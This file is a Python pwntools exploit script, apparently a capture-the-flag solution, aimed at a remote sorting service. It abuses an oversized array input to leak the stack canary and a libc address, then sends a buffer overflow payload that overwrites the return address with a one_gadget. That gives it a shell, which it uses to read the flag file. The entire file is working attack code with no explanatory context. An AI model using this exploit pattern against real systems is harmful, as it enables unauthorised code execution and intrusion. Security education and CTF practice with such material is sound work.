from pwn import *

host = 'isc.taiwan-te.ch'
port = 10007

r = remote(host, port)
size = 10006

r.recvuntil('(1~10000):\n')
r.sendline(str(size))

r.recvuntil('array:\n')
for i in range(10000):
    r.sendline('1')
for i in range(size - 10000):
    r.sendline('-1')

r.recvuntil('result\n')

sort = r.recvline()
#raw_input()
array = map(int, sort.strip().split(' '))
log.info(array)

canary = array.pop(array.index(max(array, key=abs)))
if canary < 0:
    canary += 0xffffffffffffffff + 1
log.info(hex(canary))

stack = array.pop(array.index(max(array, key=abs)))

libc = array.pop(array.index(max(array, key=abs))) - 0x21b97
log.info(hex(libc))

one = libc + 0x10a38c
p = 'a' * 0x18
p += p64(canary)
p += 'b' * 8
p += p64(one)
r.recvuntil('name:\n')
r.send(p)

r.sendline('cat /home/`whoami`/flag')

r.interactive()
